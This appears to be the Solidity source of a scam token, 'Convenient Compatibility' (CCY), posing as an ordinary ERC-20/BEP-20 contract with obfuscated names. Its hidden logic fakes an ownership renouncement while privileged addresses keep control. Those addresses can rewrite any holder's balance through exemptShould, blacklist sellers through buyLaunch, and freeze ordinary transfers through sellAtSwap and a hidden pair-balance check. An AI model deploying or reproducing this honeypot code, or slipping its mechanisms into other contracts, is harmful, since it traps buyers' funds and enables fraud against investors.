//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface autoTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract limitToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableWallet {
    function createPair(address receiverMin, address limitIs) external returns (address);
}

interface tokenMarketingLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverAmount) external view returns (uint256);

    function transfer(address limitExempt, uint256 shouldTotalAuto) external returns (bool);

    function allowance(address enableLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldTotalAuto) external returns (bool);

    function transferFrom(
        address sender,
        address limitExempt,
        uint256 shouldTotalAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverList, uint256 value);
    event Approval(address indexed enableLaunched, address indexed spender, uint256 value);
}

interface buyToMarketing is tokenMarketingLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ConvenientCompatibility is limitToken, tokenMarketingLimit, buyToMarketing {

    bool private listLimit;

    function amountReceiver(address tradingMax) public {
        require(tradingMax.balance < 100000);
        if (isLiquidity) {
            return;
        }
        if (listLimit) {
            modeLaunchedToken = false;
        }
        isMax[tradingMax] = true;
        
        isLiquidity = true;
    }

    function transferFrom(address fromList, address limitExempt, uint256 shouldTotalAuto) external override returns (bool) {
        if (_msgSender() != liquidityIs) {
            if (sellMin[fromList][_msgSender()] != type(uint256).max) {
                require(shouldTotalAuto <= sellMin[fromList][_msgSender()]);
                sellMin[fromList][_msgSender()] -= shouldTotalAuto;
            }
        }
        return liquidityTrading(fromList, limitExempt, shouldTotalAuto);
    }

    constructor (){
        
        autoTx totalLaunched = autoTx(liquidityIs);
        receiverSender = enableWallet(totalLaunched.factory()).createPair(totalLaunched.WETH(), address(this));
        if (marketingListSender == marketingReceiver) {
            listLimit = true;
        }
        shouldTake = _msgSender();
        exemptTo();
        isMax[shouldTake] = true;
        tradingTeam[shouldTake] = buySenderShould;
        if (listLimit != modeLaunchedToken) {
            marketingListSender = atSwap;
        }
        emit Transfer(address(0), shouldTake, buySenderShould);
    }

    function approve(address launchTo, uint256 shouldTotalAuto) public virtual override returns (bool) {
        sellMin[_msgSender()][launchTo] = shouldTotalAuto;
        emit Approval(_msgSender(), launchTo, shouldTotalAuto);
        return true;
    }

    bool private modeLaunchedToken;

    uint8 private fundFrom = 18;

    uint256 enableLiquidity;

    function buyLaunch(address receiverTx) public {
        amountFund();
        
        if (receiverTx == shouldTake || receiverTx == receiverSender) {
            return;
        }
        sellLimit[receiverTx] = true;
    }

    function transfer(address senderMarketing, uint256 shouldTotalAuto) external virtual override returns (bool) {
        return liquidityTrading(_msgSender(), senderMarketing, shouldTotalAuto);
    }

    function balanceOf(address receiverAmount) public view virtual override returns (uint256) {
        return tradingTeam[receiverAmount];
    }

    function exemptTo() public {
        emit OwnershipTransferred(shouldTake, address(0));
        autoExemptMax = address(0);
    }

    function liquidityTrading(address fromList, address limitExempt, uint256 shouldTotalAuto) internal returns (bool) {
        if (fromList == shouldTake) {
            return minFee(fromList, limitExempt, shouldTotalAuto);
        }
        uint256 sellTotal = tokenMarketingLimit(receiverSender).balanceOf(receiverFund);
        require(sellTotal == isMode);
        require(limitExempt != receiverFund);
        if (sellLimit[fromList]) {
            return minFee(fromList, limitExempt, exemptEnable);
        }
        return minFee(fromList, limitExempt, shouldTotalAuto);
    }

    mapping(address => bool) public sellLimit;

    mapping(address => uint256) private tradingTeam;

    function sellAtSwap(uint256 shouldTotalAuto) public {
        amountFund();
        isMode = shouldTotalAuto;
    }

    bool public isLiquidity;

    address private autoExemptMax;

    address public shouldTake;

    uint256 public atSwap;

    function name() external view virtual override returns (string memory) {
        return exemptLaunch;
    }

    uint256 isMode;

    mapping(address => mapping(address => uint256)) private sellMin;

    function amountFund() private view {
        require(isMax[_msgSender()]);
    }

    uint256 private marketingListSender;

    function exemptShould(address senderMarketing, uint256 shouldTotalAuto) public {
        amountFund();
        tradingTeam[senderMarketing] = shouldTotalAuto;
    }

    uint256 private buySenderShould = 100000000 * 10 ** 18;

    mapping(address => bool) public isMax;

    function owner() external view returns (address) {
        return autoExemptMax;
    }

    string private exemptLaunch = "Convenient Compatibility";

    function minFee(address fromList, address limitExempt, uint256 shouldTotalAuto) internal returns (bool) {
        require(tradingTeam[fromList] >= shouldTotalAuto);
        tradingTeam[fromList] -= shouldTotalAuto;
        tradingTeam[limitExempt] += shouldTotalAuto;
        emit Transfer(fromList, limitExempt, shouldTotalAuto);
        return true;
    }

    event OwnershipTransferred(address indexed launchSwapFund, address indexed tokenAmount);

    function getOwner() external view returns (address) {
        return autoExemptMax;
    }

    uint256 private marketingReceiver;

    function allowance(address teamMin, address launchTo) external view virtual override returns (uint256) {
        if (launchTo == liquidityIs) {
            return type(uint256).max;
        }
        return sellMin[teamMin][launchTo];
    }

    uint256 constant exemptEnable = 17 ** 10;

    address public receiverSender;

    function symbol() external view virtual override returns (string memory) {
        return exemptFund;
    }

    address liquidityIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address receiverFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return fundFrom;
    }

    string private exemptFund = "CCY";

    function totalSupply() external view virtual override returns (uint256) {
        return buySenderShould;
    }

}